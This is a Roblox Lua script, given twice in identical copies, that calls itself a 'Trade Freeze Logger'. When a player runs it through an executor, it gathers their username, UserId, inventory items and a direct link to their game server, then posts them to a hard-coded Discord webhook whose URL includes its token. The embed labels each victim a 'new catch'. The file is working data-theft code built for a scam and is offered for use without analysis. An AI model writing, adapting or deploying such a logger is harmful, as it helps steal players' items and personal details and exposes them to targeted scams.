local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- رابط الـ Webhook الخاص بك
local webhookUrl = "https://discord.com/api/webhooks/1553068522077298698/MXBmQ3HAGiGdWEzYCwaiP6od0NPox08YhR1I2TkzzQRo2R4wtJbiM9QCkrV5C3HCE02G"

-- 1. جمع الأدوات والفواكه الموجودة بحقيبة اللاعب (Backpack + Character)
local itemsList = {}

-- فحص الشنطة
if LocalPlayer:FindFirstChild("Backpack") then
    for _, item in ipairs(LocalPlayer.Backpack:GetChildren()) do
        table.insert(itemsList, "🍎 " .. item.Name)
    end
end

-- فحص الغرض المجهز باليد
if LocalPlayer.Character then
    for _, item in ipairs(LocalPlayer.Character:GetChildren()) do
        if item:IsA("Tool") then
            table.insert(itemsList, "✋ " .. item.Name .. " (مجهّز)")
        end
    end
end

local itemsText = #itemsList > 0 and table.concat(itemsList, "\n") or "لا توجد أدوات/فواكه بالحقيبة"

-- 2. إنتاج رابط الانضمام المباشر للسيرفر (Server Teleport Link)
local serverJoinLink = "Roblox.GameLauncher.joinGameInstance(" .. game.PlaceId .. ', "' .. game.JobId .. '")'
local directServerUrl = "https://www.roblox.com/games/" .. game.PlaceId .. "?jobId=" .. game.JobId

-- 3. تجهيز رسالة الـ Embed المنسقة
local embedData = {
    ["title"] = "🚨 صيد جديد - تفاصيل الحساب والحقيبة!",
    ["description"] = "تم تشغيل السكربت بنجاح وتجميع بيانات اللاعب السريعة.",
    ["color"] = 16711680, -- لون أحمر مميز
    ["fields"] = {
        {
            ["name"] = "👤 اسم اللاعب:",
            ["value"] = LocalPlayer.Name .. " (@" .. LocalPlayer.DisplayName .. ")",
            ["inline"] = true
        },
        {
            ["name"] = "🆔 آيدي اللاعب (UserId):",
            ["value"] = tostring(LocalPlayer.UserId),
            ["inline"] = true
        },
        {
            ["name"] = "🎮 اسم اللعبة / الماب:",
            ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
            ["inline"] = false
        },
        {
            ["name"] = "🎒 الفواكه والأغراض في الشنطة (Inventory):",
            ["value"] = "```\n" .. itemsText .. "\n```",
            ["inline"] = false
        },
        {
            ["name"] = "🔗 رابط سيرفر اللاعب المباشر (JobId):",
            ["value"] = "[اضغط هنا للدخول لنفس السيرفر](" .. directServerUrl .. ")",
            ["inline"] = false
        },
        {
            ["name"] = "🌐 رابط بروفايل اللاعب:",
            ["value"] = "https://www.roblox.com/users/" .. LocalPlayer.UserId .. "/profile",
            ["inline"] = false
        }
    },
    ["footer"] = {
        ["text"] = "Trade Freeze Logger • Roblox Data Capture"
    },
    ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
}

local payload = HttpService:JSONEncode({
    ["username"] = "Trade Freeze Bot",
    ["avatar_url"] = "https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.png",
    ["embeds"] = {embedData}
})

-- إرسال البيانات عبر Executor
local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request

if request then
    request({
        Url = webhookUrl,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = payload
    })
else
    pcall(function()
        game:HttpPost(webhookUrl, payload, false, "application/json")
    end)
end
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- رابط الـ Webhook الخاص بك
local webhookUrl = "https://discord.com/api/webhooks/1553068522077298698/MXBmQ3HAGiGdWEzYCwaiP6od0NPox08YhR1I2TkzzQRo2R4wtJbiM9QCkrV5C3HCE02G"

-- 1. جمع الأدوات والفواكه الموجودة بحقيبة اللاعب (Backpack + Character)
local itemsList = {}

-- فحص الشنطة
if LocalPlayer:FindFirstChild("Backpack") then
    for _, item in ipairs(LocalPlayer.Backpack:GetChildren()) do
        table.insert(itemsList, "🍎 " .. item.Name)
    end
end

-- فحص الغرض المجهز باليد
if LocalPlayer.Character then
    for _, item in ipairs(LocalPlayer.Character:GetChildren()) do
        if item:IsA("Tool") then
            table.insert(itemsList, "✋ " .. item.Name .. " (مجهّز)")
        end
    end
end

local itemsText = #itemsList > 0 and table.concat(itemsList, "\n") or "لا توجد أدوات/فواكه بالحقيبة"

-- 2. إنتاج رابط الانضمام المباشر للسيرفر (Server Teleport Link)
local serverJoinLink = "Roblox.GameLauncher.joinGameInstance(" .. game.PlaceId .. ', "' .. game.JobId .. '")'
local directServerUrl = "https://www.roblox.com/games/" .. game.PlaceId .. "?jobId=" .. game.JobId

-- 3. تجهيز رسالة الـ Embed المنسقة
local embedData = {
    ["title"] = "🚨 صيد جديد - تفاصيل الحساب والحقيبة!",
    ["description"] = "تم تشغيل السكربت بنجاح وتجميع بيانات اللاعب السريعة.",
    ["color"] = 16711680, -- لون أحمر مميز
    ["fields"] = {
        {
            ["name"] = "👤 اسم اللاعب:",
            ["value"] = LocalPlayer.Name .. " (@" .. LocalPlayer.DisplayName .. ")",
            ["inline"] = true
        },
        {
            ["name"] = "🆔 آيدي اللاعب (UserId):",
            ["value"] = tostring(LocalPlayer.UserId),
            ["inline"] = true
        },
        {
            ["name"] = "🎮 اسم اللعبة / الماب:",
            ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
            ["inline"] = false
        },
        {
            ["name"] = "🎒 الفواكه والأغراض في الشنطة (Inventory):",
            ["value"] = "```\n" .. itemsText .. "\n```",
            ["inline"] = false
        },
        {
            ["name"] = "🔗 رابط سيرفر اللاعب المباشر (JobId):",
            ["value"] = "[اضغط هنا للدخول لنفس السيرفر](" .. directServerUrl .. ")",
            ["inline"] = false
        },
        {
            ["name"] = "🌐 رابط بروفايل اللاعب:",
            ["value"] = "https://www.roblox.com/users/" .. LocalPlayer.UserId .. "/profile",
            ["inline"] = false
        }
    },
    ["footer"] = {
        ["text"] = "Trade Freeze Logger • Roblox Data Capture"
    },
    ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
}

local payload = HttpService:JSONEncode({
    ["username"] = "Trade Freeze Bot",
    ["avatar_url"] = "https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.png",
    ["embeds"] = {embedData}
})

-- إرسال البيانات عبر Executor
local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request

if request then
    request({
        Url = webhookUrl,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = payload
    })
else
    pcall(function()
        game:HttpPost(webhookUrl, payload, false, "application/json")
    end)
end
